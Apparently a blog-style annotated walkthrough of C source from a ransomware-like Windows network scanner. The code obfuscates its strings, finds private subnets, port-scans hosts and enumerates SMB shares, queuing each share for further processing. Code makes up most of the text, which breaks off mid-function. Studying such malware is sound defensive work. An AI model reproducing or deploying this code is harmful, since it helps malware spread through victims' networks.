<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">VOID</span><br><span class="line"><span class="title function_">network_scanner::EnumShares</span><span class="params">(</span></span><br><span class="line"><span class="params">	__in PWCHAR pwszIpAddress, </span></span><br><span class="line"><span class="params">	__out PSHARE_LIST ShareList</span></span><br><span class="line"><span class="params">	)</span></span><br><span class="line">&#123;</span><br><span class="line">	NET_API_STATUS Result;</span><br><span class="line">	LPSHARE_INFO_1 ShareInfoBuffer = <span class="literal">NULL</span>;</span><br><span class="line">	DWORD er = <span class="number">0</span>, tr = <span class="number">0</span>, resume = <span class="number">0</span>;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">	&#123;</span><br><span class="line">		Result = (NET_API_STATUS)pNetShareEnum(pwszIpAddress, <span class="number">1</span>, (LPBYTE*)&amp;ShareInfoBuffer, MAX_PREFERRED_LENGTH, &amp;er, &amp;tr, &amp;resume);</span><br><span class="line">		<span class="keyword">if</span> (Result == ERROR_SUCCESS)</span><br><span class="line">		&#123;</span><br><span class="line"></span><br><span class="line">			LPSHARE_INFO_1 TempShareInfo = ShareInfoBuffer;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">for</span> (DWORD i = <span class="number">1</span>; i &lt;= er; i++)</span><br><span class="line">			&#123;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (TempShareInfo-&gt;shi1_type == STYPE_DISKTREE	||</span><br><span class="line">					TempShareInfo-&gt;shi1_type == STYPE_SPECIAL	||</span><br><span class="line">					TempShareInfo-&gt;shi1_type == STYPE_TEMPORARY) </span><br><span class="line">				&#123;</span><br><span class="line"></span><br><span class="line">					PSHARE_INFO ShareInfo = (PSHARE_INFO)m_malloc(<span class="keyword">sizeof</span>(SHARE_INFO));</span><br><span class="line">					</span><br><span class="line">					<span class="keyword">if</span> (ShareInfo &amp;&amp; plstrcmpiW(TempShareInfo-&gt;shi1_netname, OBFW(<span class="string">L&quot;ADMIN$&quot;</span>))) &#123;</span><br><span class="line"></span><br><span class="line">						plstrcpyW(ShareInfo-&gt;wszSharePath, OBFW(<span class="string">L&quot;\\\\&quot;</span>));</span><br><span class="line">						plstrcatW(ShareInfo-&gt;wszSharePath, pwszIpAddress);</span><br><span class="line">						plstrcatW(ShareInfo-&gt;wszSharePath, OBFW(<span class="string">L&quot;\\&quot;</span>));</span><br><span class="line">						plstrcatW(ShareInfo-&gt;wszSharePath, TempShareInfo-&gt;shi1_netname);</span><br><span class="line"></span><br><span class="line">						logs::Write(OBFW(<span class="string">L&quot;Found share %s.&quot;</span>), ShareInfo-&gt;wszSharePath);</span><br><span class="line">						TAILQ_INSERT_TAIL(ShareList, ShareInfo, Entries);</span><br><span class="line"></span><br><span class="line">					&#125;</span><br><span class="line"></span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				TempShareInfo++;</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			pNetApiBufferFree(ShareInfoBuffer);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125; <span class="keyword">while</span> (Result == ERROR_MORE_DATA);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="StartScan"><a href="#StartScan" class="headerlink" title="StartScan"></a>StartScan</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">network_scanner::StartScan()</span><br><span class="line">&#123;</span><br><span class="line">	WSADATA WsaData;</span><br><span class="line">	HANDLE hHostHandler = <span class="literal">NULL</span>, hPortScan = <span class="literal">NULL</span>;</span><br><span class="line">	PSUBNET_INFO SubnetInfo = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	g_ActiveOperations = <span class="number">0</span>;</span><br><span class="line">	pWSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;WsaData);</span><br><span class="line">	pInitializeCriticalSection(&amp;g_CriticalSection);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!GetConnectEX()) &#123;</span><br><span class="line"></span><br><span class="line">		logs::Write(OBFW(<span class="string">L&quot;Can&#x27;t get ConnectEx.&quot;</span>));</span><br><span class="line">		<span class="keyword">goto</span> cleanup;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	GetCurrentIpAddress();</span><br><span class="line">	</span><br><span class="line">	g_IocpHandle = pCreateIoCompletionPort(INVALID_HANDLE_VALUE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (g_IocpHandle == <span class="literal">NULL</span>) &#123;</span><br><span class="line"></span><br><span class="line">		logs::Write(OBFW(<span class="string">L&quot;Can&#x27;t create io completion port.&quot;</span>));</span><br><span class="line">		<span class="keyword">goto</span> cleanup;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	TAILQ_INIT(&amp;g_SubnetList);</span><br><span class="line">	TAILQ_INIT(&amp;g_HostList);</span><br><span class="line">	TAILQ_INIT(&amp;g_ConnectionList);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!GetSubnets(&amp;g_SubnetList)) &#123;</span><br><span class="line"></span><br><span class="line">		logs::Write(OBFW(<span class="string">L&quot;Can&#x27;t get subnets.&quot;</span>));</span><br><span class="line">		<span class="keyword">goto</span> cleanup;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	hHostHandler = pCreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, &amp;HostHandler, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (hHostHandler == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line"></span><br><span class="line">		logs::Write(OBFW(<span class="string">L&quot;Can&#x27;t create host thread.&quot;</span>));</span><br><span class="line">		<span class="keyword">goto</span> cleanup;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	hPortScan = pCreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, &amp;PortScanHandler, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (hPortScan == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line"></span><br><span class="line">		logs::Write(OBFW(<span class="string">L&quot;Can&#x27;t create port scan thread.&quot;</span>));</span><br><span class="line">		<span class="keyword">goto</span> cleanup;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	pPostQueuedCompletionStatus(g_IocpHandle, <span class="number">0</span>, START_COMPLETION_KEY, <span class="literal">NULL</span>);</span><br><span class="line">	pWaitForSingleObject(hPortScan, INFINITE);</span><br><span class="line"></span><br><span class="line">	AddHost(STOP_MARKER);</span><br><span class="line">	pWaitForSingleObject(hHostHandler, INFINITE);</span><br><span class="line"></span><br><span class="line">cleanup:</span><br><span class="line">	pDeleteCriticalSection(&amp;g_CriticalSection);</span><br><span class="line">	<span class="keyword">if</span> (g_IocpHandle) &#123;</span><br><span class="line">		pCloseHandle(g_IocpHandle);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (hHostHandler) &#123;</span><br><span class="line">		pCloseHandle(hHostHandler);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (hPortScan) &#123;</span><br><span class="line">		pCloseHandle(hPortScan);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	pWSACleanup();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="GetCurrentIpAddress"><a href="#GetCurrentIpAddress" class="headerlink" title="GetCurrentIpAddress"></a>GetCurrentIpAddress</h3><ul>
<li><p>pgethostname</p>
<ul>
<li><p>SOCKET_ERROR &#x3D;&#x3D; (INT)pgethostname(szHostName, 256)</p>
</li>
<li><p>g_HostEntry &#x3D; (struct hostent*)pgethostbyname(szHostName);</p>
</li>
</ul>
</li>
</ul>
<blockquote>
<p>If no error occurs, <strong>gethostname</strong> returns zero. Otherwise, </p>
<p>it returns SOCKET_ERROR and a specific error code can be retrieved by calling <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/desktop/api/winsock/nf-winsock-wsagetlasterror">WSAGetLastError</a>.</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">STATIC</span><br><span class="line">DWORD <span class="title function_">GetCurrentIpAddress</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	CHAR szHostName[<span class="number">256</span>];</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span> <span class="title">InAddr</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (SOCKET_ERROR == (INT)pgethostname(szHostName, <span class="number">256</span>)) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	g_HostEntry = (<span class="keyword">struct</span> hostent*)pgethostbyname(szHostName);</span><br><span class="line">	<span class="keyword">if</span> (!g_HostEntry) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="GetConnectEX"><a href="#GetConnectEX" class="headerlink" title="GetConnectEX"></a>GetConnectEX</h3><ul>
<li>WSASocketW<ul>
<li>creates a socket that is bound to a specific transport-service provider</li>
</ul>
</li>
<li>WSAIoctl<ul>
<li>controls the mode of a socket.</li>
</ul>
</li>
<li>closesocket</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">STATIC</span><br><span class="line">BOOL</span><br><span class="line"><span class="title function_">GetConnectEX</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	DWORD dwBytes;</span><br><span class="line">	<span class="type">int</span> rc;</span><br><span class="line"></span><br><span class="line">	SOCKET sock = (SOCKET)pWSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (sock == INVALID_SOCKET)</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">	GUID guid = WSAID_CONNECTEX;</span><br><span class="line">	rc = (<span class="type">int</span>)pWSAIoctl(sock, SIO_GET_EXTENSION_FUNCTION_POINTER,</span><br><span class="line">		&amp;guid, <span class="keyword">sizeof</span>(guid),</span><br><span class="line">		&amp;g_ConnectEx, <span class="keyword">sizeof</span>(g_ConnectEx),</span><br><span class="line">		&amp;dwBytes, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (rc != <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">	rc =(<span class="type">int</span>) pclosesocket(sock);</span><br><span class="line">	<span class="keyword">if</span> (rc != <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="GetSubnets"><a href="#GetSubnets" class="headerlink" title="GetSubnets"></a>GetSubnets</h3><ul>
<li>GetIpNetTable<ul>
<li>GetIpNetTable(IpNetTable, &amp;TableSize, FALSE);(to get the table size)</li>
<li>ULONG Result &#x3D; (ULONG)pGetIpNetTable(IpNetTable, &amp;TableSize, FALSE);(to get the result)</li>
<li>The <strong>GetIfTable</strong> function retrieves the MIB-II interface table.</li>
</ul>
</li>
</ul>
<p>if the ip is start with “172.”,”192.168.”,”10.”,”169.”, there are subnets in this host.</p>
<p>And check if the subnet is already in the SubnetList . If not , add this SubnetInfo into SubnetList</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">	IpNetTable = (PMIB_IPNETTABLE)m_malloc(TableSize);</span><br><span class="line">	<span class="keyword">if</span> (!IpNetTable) &#123;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ULONG Result = (ULONG)pGetIpNetTable(IpNetTable, &amp;TableSize, FALSE);</span><br><span class="line">	<span class="keyword">if</span> (Result != ERROR_SUCCESS) &#123;</span><br><span class="line">		</span><br><span class="line">		logs::Write(OBFW(<span class="string">L&quot;GetIpNetTable fails. GetLastError = %lu&quot;</span>), pGetLastError());</span><br><span class="line">		<span class="built_in">free</span>(IpNetTable);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (ULONG i = <span class="number">0</span>; i &lt; IpNetTable-&gt;dwNumEntries; i++) &#123;</span><br><span class="line"></span><br><span class="line">		WCHAR wszIpAddress[INET_ADDRSTRLEN];</span><br><span class="line">		ULONG dwAddress = IpNetTable-&gt;table[i].dwAddr;	</span><br><span class="line">		PUCHAR HardwareAddres = IpNetTable-&gt;table[i].bPhysAddr;</span><br><span class="line">		ULONG HardwareAddressSize = IpNetTable-&gt;table[i].dwPhysAddrLen;</span><br><span class="line">		</span><br><span class="line">		RtlSecureZeroMemory(wszIpAddress, <span class="keyword">sizeof</span>(wszIpAddress));</span><br><span class="line"></span><br><span class="line">		IN_ADDR InAddr;</span><br><span class="line">		InAddr.S_un.S_addr = dwAddress;</span><br><span class="line">		PCHAR szIpAddress = pinet_ntoa(InAddr);</span><br><span class="line">		DWORD le = WSAGetLastError();</span><br><span class="line"></span><br><span class="line">		PCSTR p1 = (PCSTR)pStrStrIA(szIpAddress, OBFA(<span class="string">&quot;172.&quot;</span>));</span><br><span class="line">		PCSTR p2 = (PCSTR)pStrStrIA(szIpAddress, OBFA(<span class="string">&quot;192.168.&quot;</span>));</span><br><span class="line">		PCSTR p3 = (PCSTR)pStrStrIA(szIpAddress, OBFA(<span class="string">&quot;10.&quot;</span>));</span><br><span class="line">		PCSTR p4 = (PCSTR)pStrStrIA(szIpAddress, OBFA(<span class="string">&quot;169.&quot;</span>));</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (p1 == szIpAddress ||</span><br><span class="line">			p2 == szIpAddress ||</span><br><span class="line">			p3 == szIpAddress ||</span><br><span class="line">			p4 == szIpAddress)</span><br><span class="line">		&#123;</span><br><span class="line"></span><br><span class="line">			BOOL Found = FALSE;</span><br><span class="line"></span><br><span class="line">			PSUBNET_INFO SubnetInfo = <span class="literal">NULL</span>;</span><br><span class="line">			TAILQ_FOREACH(SubnetInfo, SubnetList, Entries) &#123;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (!<span class="built_in">memcmp</span>(&amp;SubnetInfo-&gt;dwAddress, &amp;dwAddress, <span class="number">3</span>)) &#123;</span><br><span class="line"></span><br><span class="line">					Found = TRUE;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">			<span class="keyword">if</span> (!Found) &#123;</span><br><span class="line"></span><br><span class="line">				BYTE bAddres[<span class="number">4</span>];</span><br><span class="line">				*(ULONG*)bAddres = dwAddress;</span><br><span class="line">				bAddres[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">				PSUBNET_INFO NewSubnet = (PSUBNET_INFO)m_malloc(<span class="keyword">sizeof</span>(SUBNET_INFO));</span><br><span class="line">				<span class="keyword">if</span> (!NewSubnet) &#123;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				RtlCopyMemory(&amp;NewSubnet-&gt;dwAddress, bAddres, <span class="number">4</span>);</span><br><span class="line">				TAILQ_INSERT_TAIL(SubnetList, NewSubnet, Entries);</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">free</span>(IpNetTable);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="HostHandler"><a href="#HostHandler" class="headerlink" title="HostHandler"></a>HostHandler</h3><ul>
<li><p><code>pEnterCriticalSection(&amp;g_CriticalSection);</code></p>
<ul>
<li><p>When more than one processes access a same code segment that segment is known as critical section. Critical section contains shared variables or resources which are needed to be synchronized to maintain consistency of data variable.<a target="_blank" rel="noopener" href="https://www.geeksforgeeks.org/g-fact-70/">Critical Section in Synchronization</a></p>
<ul>
<li><p>&#96;&#96;&#96;c<br>  pEnterCriticalSection(&amp;g_CriticalSection);</p>
<p>  PHOST_INFO HostInfo &#x3D; TAILQ_FIRST(&amp;g_HostList);<br>  if (HostInfo &#x3D;&#x3D; NULL) {<br>  pLeaveCriticalSection(&amp;g_CriticalSection);<br>  pSleep(1000);<br>  continue;<br>      }<br>  TAILQ_REMOVE(&amp;g_HostList, HostInfo, Entries);<br>  pLeaveCriticalSection(&amp;g_CriticalSection);</p>
  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- `network_scanner::PSHARE_INFO ShareInfo = TAILQ_FIRST(&amp;ShareList);`</span><br><span class="line">    - get the host&#x27;s shareinfo </span><br><span class="line">    </span><br><span class="line">- `threadpool::PutTask(threadpool::NETWORK_THREADPOOL, ShareInfo-&gt;wszSharePath);`</span><br><span class="line"></span><br><span class="line">```c</span><br><span class="line">STATIC</span><br><span class="line">DWORD</span><br><span class="line">WINAPI</span><br><span class="line">HostHandler(__in PVOID pArg)</span><br><span class="line">&#123;</span><br><span class="line">	network_scanner::SHARE_LIST ShareList;</span><br><span class="line">	TAILQ_INIT(&amp;ShareList);</span><br><span class="line"></span><br><span class="line">	while (TRUE) &#123;</span><br><span class="line"></span><br><span class="line">		pEnterCriticalSection(&amp;g_CriticalSection);</span><br><span class="line"></span><br><span class="line">		PHOST_INFO HostInfo = TAILQ_FIRST(&amp;g_HostList);</span><br><span class="line">		if (HostInfo == NULL) &#123;</span><br><span class="line"></span><br><span class="line">			pLeaveCriticalSection(&amp;g_CriticalSection);</span><br><span class="line">			pSleep(1000);</span><br><span class="line">			continue;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		TAILQ_REMOVE(&amp;g_HostList, HostInfo, Entries);</span><br><span class="line">		pLeaveCriticalSection(&amp;g_CriticalSection);</span><br><span class="line"></span><br><span class="line">		if (HostInfo-&gt;dwAddres == STOP_MARKER) &#123;</span><br><span class="line"></span><br><span class="line">			free(HostInfo);</span><br><span class="line">			pExitThread(EXIT_SUCCESS);</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		network_scanner::EnumShares(HostInfo-&gt;wszAddress, &amp;ShareList);</span><br><span class="line">		while (!TAILQ_EMPTY(&amp;ShareList))</span><br><span class="line">		&#123;</span><br><span class="line"></span><br><span class="line">			network_scanner::PSHARE_INFO ShareInfo = TAILQ_FIRST(&amp;ShareList);</span><br><span class="line">			logs::Write(OBFW(L&quot;Starting search on share %s.&quot;), ShareInfo-&gt;wszSharePath);</span><br><span class="line">			threadpool::PutTask(threadpool::NETWORK_THREADPOOL, ShareInfo-&gt;wszSharePath);</span><br><span class="line">			TAILQ_REMOVE(&amp;ShareList, ShareInfo, Entries);</span><br><span class="line">			free(ShareInfo);</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		free(HostInfo);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	pExitThread(EXIT_SUCCESS);</span><br><span class="line">	return EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="CreateHostTable"><a href="#CreateHostTable" class="headerlink" title="CreateHostTable"></a>CreateHostTable</h3><ul>
<li>WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, WSA_FLAG_OVERLAPPED);<ul>
<li>socket with tcp</li>
</ul>
</li>
<li>bind<ul>
<li>The <strong>bind</strong> function associates a local address with a socket.</li>
</ul>
</li>
<li>CreateIoCompletionPort((HANDLE)ConnectCtx-&gt;s, g_IocpHandle, CONNECT_COMPLETION_KEY, 0)<ul>
<li>Creates an input&#x2F;output (I&#x2F;O) completion port and associates it with a specified file handle, or creates an I&#x2F;O completion port that is not yet associated with a file handle, allowing association at a later time.</li>
<li>If the function succeeds, the return value is the handle to an I&#x2F;O completion port</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">STATIC</span><br><span class="line">BOOL</span><br><span class="line"><span class="title function_">CreateHostTable</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	PSUBNET_INFO SubnetInfo = TAILQ_FIRST(&amp;g_SubnetList);</span><br><span class="line">	<span class="keyword">if</span> (!SubnetInfo) &#123;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	BYTE bAddres[<span class="number">4</span>];</span><br><span class="line">	DWORD dwAddress;</span><br><span class="line">	RtlCopyMemory(bAddres, &amp;SubnetInfo-&gt;dwAddress, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> 